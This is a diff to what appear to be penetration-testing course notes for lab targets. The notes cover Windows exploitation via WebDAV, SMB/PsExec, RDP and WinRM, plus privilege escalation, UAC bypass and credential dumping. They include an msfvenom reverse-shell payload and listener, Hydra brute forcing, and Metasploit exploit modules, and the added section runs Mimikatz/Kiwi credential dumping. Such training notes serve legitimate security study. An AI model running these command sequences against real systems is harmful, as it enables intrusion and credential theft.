@@ -19,6 +19,7 @@ The first step of the exploitation process will involve identifying whether WebD
 - davtest - Used to scan, authenticate and exploit a WebDAV server. Is Pre-installed on most offensive penetration testing distributions like Kali and Parrot OS.
 - cadaver - cadaver supports file upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking on WebDAV servers. Is Pre-installed on most offensive penetration testing distributions like Kali and Parrot OS.
 
+
 ### Exploiting Microsoft WEBDAV Service Practical
 
 - `ping demo.ine.local`
@@ -33,6 +34,7 @@ The first step of the exploitation process will involve identifying whether WebD
 - `dir C:\`
 - `type C:\flag.txt`
 
+
 ### Practical Exploiting WebDAV With Metasploit
 
 - `nmap -sV -p 80 --script=http-enum demo.ine.local`
@@ -42,6 +44,7 @@ The first step of the exploitation process will involve identifying whether WebD
 - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.37.7 LPORT=1234 -f asp > shell.asp` (`-p` = payload `-f` = fileformat)  Generate ASP payload
 - `cadaver http://10.2.24.226/webdav` afterwards type in username and passwort
 - `put /root/shell.asp` Paste asp file on webserver. The next step would be to connect to the webserver and execute it. But before we can do this, we need a listener or a handler that will receive the reverse connection and then send the stage that will then provide us with the meterpreter session when executed. 
+
 
 ### Use Multihandler as listener
 
@@ -53,6 +56,7 @@ The first step of the exploitation process will involve identifying whether WebD
 - `set LHOST 10.10.37.7`
 - `set LPORT 1234`
 - `run` Start listener(reverse TCP handler) and waits for a connection from the actual asp payload we have created. 
+
 
 ### Run metasploit framework and exploit the target using the IIS webdav exploit module.
 
@@ -70,6 +74,7 @@ After We have got a Meterpreter session:
 - `dir`
 - `type flag.txt` This reveals the flag to us.
 
+
 ### Exploiting SMB With PsExec
 
 SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a LAN. SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using port 139. SAMBA is the open source Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.
@@ -77,6 +82,7 @@ SMB (Server Message Block) is a network file sharing protocol that is used to fa
 PsExec is a lightweight telnet-replacement developed by Microsoft that allows you execute processes on remote windows systems using any user’s credentials. PsExec authentication is performed via SMB. We can use the PsExec utility to authenticate with the target system legitimately and run arbitrary commands or launch a remote command prompt. It is very similar to RDP, however, instead of controlling the remote system via GUI, commands are sent via CMD.
 
 In order to utilize PsExec to gain access to a Windows target, we will need to identify legitimate user accounts and their respective passwords or password hashes. This can be done by leveraging various tools and techniques, however, the most common technique will involve performing an SMB login brute-force attack. We can narrow down our brute-force attack to only include common Windows user accounts like: Administrator. After we have obtained a legitimate user account and password, we can use the credentials to authenticate with the target system via PsExec and execute arbitrary system commands or obtain a reverse shell.
+
 
 ### Practical Exploiting SMB With PsExec
 
@@ -99,6 +105,7 @@ In order to utilize PsExec to gain access to a Windows target, we will need to i
 - `dir`
 - `type flag.txt` This reveals the flag to us.
 
+
 ### Exploiting Insecure RDP Service
 
 - `ping demo.ine.local`
@@ -111,9 +118,11 @@ In order to utilize PsExec to gain access to a Windows target, we will need to i
 - `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://demo.ine.local -s 3333` Running the Hydra tool to find a valid username and password from the provided list.
 - `xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333` We have discovered four valid users and passwords. Access the remote server using xfreerdp tool.
 
+
 ### Exploiting WinRM
 
 Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to facilitate remote access with Windows systems over HTTP(S). Microsoft implemented WinRM in to Windows in order to make life easier for system administrators. WinRM is typically used in the following ways: Remotely access and interact with Windows hosts on a local network. Remotely access and execute commands on Windows systems. Manage and configure Windows systems remotely. WinRM typically uses TCP port 5985 and 5986 (HTTPS).
+
 
 ### Practical Exploiting WinRM
 
@@ -130,6 +139,7 @@ Windows Remote Management (WinRM) is a Windows remote management protocol that c
 - `set PASSWORD tinkerbell`
 - `set FORCE_VBS true` Force the module to use the VBS CmdStager
 - `getuid` puts the UID of the process out
+
 
 ## Windows Privilege Escalation
 
@@ -148,6 +158,7 @@ Kernel exploits on Windows will typically target vulnerabilities in the Windows 
 - Windows-Exploit-Suggester: GitHub: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
 - Windows-kernel-Exploits: GitHub: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135
 
+
 ### Bypassing UAC
 
 - UACMe: Github: https://github.com/hfiref0x/UACME
@@ -158,6 +169,7 @@ Definition: UAC is a Windows security feature introduced in Windows Vista. It he
 Purpose: It ensures that any changes to the system require approval from an administrator or a user with administrative rights.
 Prompts: Non-privileged users receive a credential prompt (must enter administrator credentials). Privileged users see a consent prompt (just confirm the action).
 Security Risk: Some attacks can bypass UAC, allowing malicious executables to run with elevated privileges without proper authorization.
+
 
 ### Bypassing UAC with UACMe Practical
 
@@ -226,6 +238,7 @@ system will primarily depend on the privileges assigned to the account that has 
 
 Alternate Data Streams (ADS) is an NTFS (New Technology File System) file attribute and was designed to provide compatibility with the MacOS HFS (Hierarchical File System). Any file created on an NTFS formatted drive will have two different forks/streams: Data stream - Default stream that contains the data of the file and Resource stream - Typically contains the metadata of the file. Attackers can use ADS to hide malicious code or executables in legitimate files in order to evade detection. This can be done by storing the malicious code or executables in the file attribute resource stream (metadata) of a legitimate file. This technique is usually used to evade basic signature based AVs and static scanning tools.
 
+
 ## Windows Credential Dumping
 
 ### Windows Password Hashes
@@ -259,6 +272,7 @@ Windows can automate a variety of repetitive tasks, such as the mass rollout or 
 - C:\Windows\Panther\Autounattend.xml
 As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64.
 
+
 ### Practical Unattended Installation
 
 **Get access on the machine**
@@ -290,3 +304,33 @@ We are running as a student user. The PowerSploit framework and Powerup.ps1 scri
 - `cd C:\\Users\\Administrator\\Desktop`
 - `dir`
 - `cat flag.txt`
+
+
+### Dumping hashes with Mimikatz
+
+Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy. It allows for the extraction of clear-text passwords, hashes and Kerberos tickets from memory. Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes are cached. We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi. Mimikatz will require elevated privileges in order to run correctly. 
+
+
+### Practical hash dumping with Mimikatz.
+
+- `service postgresql start && msfconsole`
+- `use exploit/windows/http/badblue_passthru`
+- `set RHOST 10.2.30.1`
+- `exploit`
+- `pgrep explorer`
+- `migrate 592`
+- `load kiwi` Load kiwi module
+- `?` for help menue
+- `creds_all`
+- `lsa_dump_sam`
+- `LSA secrets`
+
+
+### Pass-The-Hash Attack
+
+Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately. We can use multiple tools to facilitate a Pass-The-Hash attack:
+- Metasploit PsExec module
+- Crackmapexec
+This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation.
+
+### Practical Pass-The-Hash Attack
